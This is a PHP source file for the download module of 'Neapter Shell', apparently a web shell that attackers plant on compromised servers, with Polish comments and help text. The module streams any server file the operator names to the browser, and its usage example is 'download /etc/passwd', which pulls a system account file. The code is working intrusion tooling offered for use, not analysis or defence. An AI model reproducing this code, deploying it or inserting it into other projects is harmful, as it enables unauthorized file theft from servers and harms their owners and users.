<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * ModuleDownload - Pobieranie pliku
 */
class ModuleDownload implements ShellInterface
{
	/**
	 * Obiekt Shell
	 *
	 * @access private
	 * @var    object
	 */
	private $oShell;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @param  object $oShell Obiekt Shell
	 * @return void
	 */
	public function __construct( Shell $oShell )
	{
		$this -> oShell = $oShell;
	}

	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array
		(
			'download',
			'down',
			'get'
		);
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.02 2011-09-08 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Pobieranie pliku

	Użycie:
		download ścieżka_do_pliku

	Opcje:
		-g pobieranie przy użyciu kompresji GZIP

	Przykład:
		download /etc/passwd
		download -g /etc/passwd
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc === 0 )
		{
			return $this -> getHelp();
		}

		$bGzip = in_array( 'g', $this -> oShell -> aOptv );

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> oShell -> sArgv ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> oShell -> sArgv );
		}

		/**
		 * Kompresja zawartosci strony
		 */
		ob_start( $bGzip ? 'ob_gzhandler' : NULL );

		/**
		 * Naglowki
		 */
		header( 'Cache-Control: must-revalidate, post-check=0, pre-check=0', TRUE );
		header( sprintf( 'Content-Disposition: attachment; filename="%s"', basename( $this -> oShell -> sArgv ) ), TRUE );
		header( 'Content-Type: application/octet-stream', TRUE );

		if( ( $rFile = fopen( $this -> oShell -> sArgv, 'r' ) ) !== FALSE )
		{
			if( ! $bGzip )
			{
				header( sprintf( 'Content-Length: %s', filesize( $this -> oShell -> sArgv ) ), TRUE );
			}

			while( ! feof( $rFile ) )
			{
				echo fread( $rFile, 2097152 );
				@ ob_flush();
				@ flush();
			}
		}

		ob_end_flush();
		exit ;
	}

}